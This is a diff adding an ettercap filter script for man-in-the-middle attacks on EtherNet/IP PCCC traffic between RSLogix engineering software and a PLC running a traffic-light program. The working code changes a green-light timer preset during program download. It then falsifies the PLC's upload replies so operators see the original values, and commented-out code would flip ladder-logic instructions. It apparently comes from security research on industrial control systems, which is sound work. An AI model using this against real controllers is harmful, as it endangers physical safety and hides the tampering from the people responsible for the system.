@@ -1,0 +1,85 @@
+################################################
+#                                              #   
+#        Modify packets: (RSLogix -> PLC)      #
+#                                              #
+################################################
+
+
+## Time change in traffic light PLC program ##
+#  Change the duration of green light from 5 seconds to 100 seconds
+
+if (ip.proto == TCP && tcp.dst == 44818) {
+#   if (DATA.pcccreply == "\x4f") {
+#      msg("Controller PCCC reply\n");
+#      DATA.pcccrdat = "\xff";
+#      msg("PCC file information invalidated with all ones - lights up");
+#   }
+#    exec("/usr/bin/touch /home/hyunguk/etterfilter/logfile");
+#    log(DATA.pcccMsgType, "/home/hyunguk/etterfilter/logfile");
+#    exit();
+    if (DATA.pccc == "\x0f"){
+#        msg("Command Packet");
+        if (DATA.pccc+4 == "\x80" && DATA.pccc+5 == "\x01"){
+            msg("The PLC is entering Programing Mode");
+        }
+        if (DATA.pccc+4 == "\x80" && DATA.pccc+5 == "\x06"){
+            msg("The PLC is entering back to RUN Mode");
+        }
+        if (DATA.pccc+4 == "\xaa"){     # File downloading
+#            msg("The PLC is downloading files");
+#            if (DATA.pccc+7 == "\x22"){    # PLC program file
+#                msg("File type 22 (PLC Program) is downloading");
+#                log(DATA.pccc, "/home/hyunguk/etterfilter/logfile");
+#                if (DATA.pccc+16 == "\xe4"){        # XIC
+#                    msg("First XIC is detected");
+#                    DATA.pccc+12 = "\x72";
+#                    DATA.pccc+13 = "\xf5";
+#                    DATA.pccc+16 = "\xe8";          # Change to XIO
+#                    exit();
+#                }
+#            }
+            if (DATA.pccc+7 == "\x86"){     # Timer file
+                msg("File type 86 (Timer) is downloading");
+                DATA.pccc+18 = "\x64";  # Change Second timer to 100 seconds (specifically targeting the traffic_light.rss )
+                exit();
+            }
+        }
+    }
+}
+
+################################################
+#                                              #   
+#        Modify packets: PLC -> RSLogix        #
+#                                              #
+################################################
+
+if (ip.proto == TCP) {
+# It seems ettercap doesn't support using variable.
+#
+#    flag = 0;
+#    if (tcp.dst == 44818){         # RSLogix -> PLC
+#        if (DATA.pccc == "\x0f00" && DATA.pccc+6 == "\x0486"){   # File:04-Type:86
+#            msg("Detect command from RSLogix to upload File:04-Type:86(Timer)");
+#            flag = 1;
+#        } 
+#    }
+#    else if (tcp.src == 44818){                          # RSLogix -> PLC
+#        if (DATA.pccc == "\x4f00" && flag == 1){
+#            msg("I catch timer data file from upload traffic");
+#            log(DATA.pccc, "home/hyunguk/etterfilter/logfile");    
+#        }       
+#    }
+
+# Below is highly targeted to specific configuration (Can't be generally used)
+# Maybe I need to find other way to use variable and save state information. Try scapy??
+
+    if (tcp.src == 44818){      # RSLogix -> PLC
+        if (DATA.pccc == "\x4f" && DATA.pccc+1 == "\x00"){         # Reply
+            if (DATA.pccc+12 == "\x64" && DATA.pccc+13 == "\x00"){  # Second timer in trafic_light.rss was abnormaly set to 100 second
+                msg("I catch timer data file from upload traffic");
+                DATA.pccc+12 = "\x05";      # Change the timer Preset to 3 seconds to deceive RSLogix as it is correct
+                DATA.pccc+14 = "\x00";      # Change the time Accum to 0 second
+            }  
+        }
+    }
+}
